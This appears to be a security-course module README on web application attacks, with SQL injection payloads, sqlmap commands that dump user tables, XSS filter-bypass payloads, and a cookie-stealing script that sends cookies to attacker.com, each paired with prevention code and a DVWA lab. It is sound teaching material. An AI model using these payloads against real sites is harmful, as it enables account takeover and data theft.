# Module 03 — Web Application Security

**Duration:** Week 5–6 | **Difficulty:** 🟡 Intermediate | **Status:** ✅ Completed

---

## Learning Objectives

- Identify and exploit the OWASP Top 10 vulnerabilities
- Use Burp Suite to intercept and modify HTTP requests
- Perform SQL injection, XSS, and CSRF attacks in a safe lab environment
- Write a professional vulnerability assessment report

---

## OWASP Top 10 (2021)

| Rank | Vulnerability | Risk |
|------|--------------|------|
| A01 | Broken Access Control | 🔴 Critical |
| A02 | Cryptographic Failures | 🔴 Critical |
| A03 | Injection (SQLi, NoSQLi, etc.) | 🔴 Critical |
| A04 | Insecure Design | 🟠 High |
| A05 | Security Misconfiguration | 🟠 High |
| A06 | Vulnerable & Outdated Components | 🟡 Medium |
| A07 | Authentication Failures | 🔴 Critical |
| A08 | Software & Data Integrity Failures | 🟠 High |
| A09 | Security Logging Failures | 🟡 Medium |
| A10 | Server-Side Request Forgery (SSRF) | 🟠 High |

---

## SQL Injection

### What It Is
SQL injection occurs when user input is directly concatenated into a SQL query without sanitization.

**Vulnerable code (PHP):**
```php
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
```

**Attack payload:**
```sql
' OR '1'='1
' OR 1=1--
admin'--
' UNION SELECT username, password FROM users--
```

### Manual Testing with sqlmap

```bash
# Test a login form
sqlmap -u "http://target.com/login.php" \
       --data "username=admin&password=test" \
       --level=3 --risk=2

# Dump all databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump tables from specific database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump
```

### Prevention
```php
// Use prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

---

## Cross-Site Scripting (XSS)

### Types
- **Reflected XSS** — payload in URL, executed immediately
- **Stored XSS** — payload saved in database, executes for every visitor
- **DOM-based XSS** — client-side JavaScript processes attacker-controlled data

### Test Payloads
```javascript
// Basic alert test
<script>alert('XSS')</script>

// Cookie stealing
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

// Bypass filters
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
```

### Prevention
```python
# Always escape output
import html
safe_output = html.escape(user_input)

# Set Content Security Policy header
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## Burp Suite Workflow

```
1. Set Firefox proxy to 127.0.0.1:8080
2. Install Burp CA certificate in Firefox
3. Browse target application — Burp captures requests
4. Send interesting requests to Repeater (Ctrl+R)
5. Modify parameters and observe responses
6. Use Intruder for brute force / fuzzing
7. Use Scanner (Pro) or manual checks for vulnerabilities
```

**Key Burp features:**
- **Proxy** — intercept & modify live traffic
- **Repeater** — replay modified requests
- **Intruder** — automated fuzzing/brute force
- **Decoder** — encode/decode Base64, URL, HTML
- **Comparer** — diff two responses

---

## Practice Lab: DVWA Setup

```bash
# Using Docker
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa

# Navigate to http://localhost/setup.php
# Click "Create / Reset Database"
# Login: admin / password
# Set Security Level to "Low" to start
```

**DVWA Challenges to complete:**
- [ ] SQL Injection (Low → High)
- [ ] XSS Reflected (Low → High)
- [ ] XSS Stored (Low → High)
- [ ] CSRF (Low → High)
- [ ] File Upload (Low → High)
- [ ] Command Injection (Low → High)
- [ ] Brute Force (Low → High)

---

## Practice Questions

1. What is the difference between reflected and stored XSS?
2. How does a prepared statement prevent SQL injection?
3. What HTTP header prevents clickjacking?
4. What does CSRF stand for and how does a CSRF token prevent it?

---

## Next Module → [04 — OSINT](../04-osint/README.md)
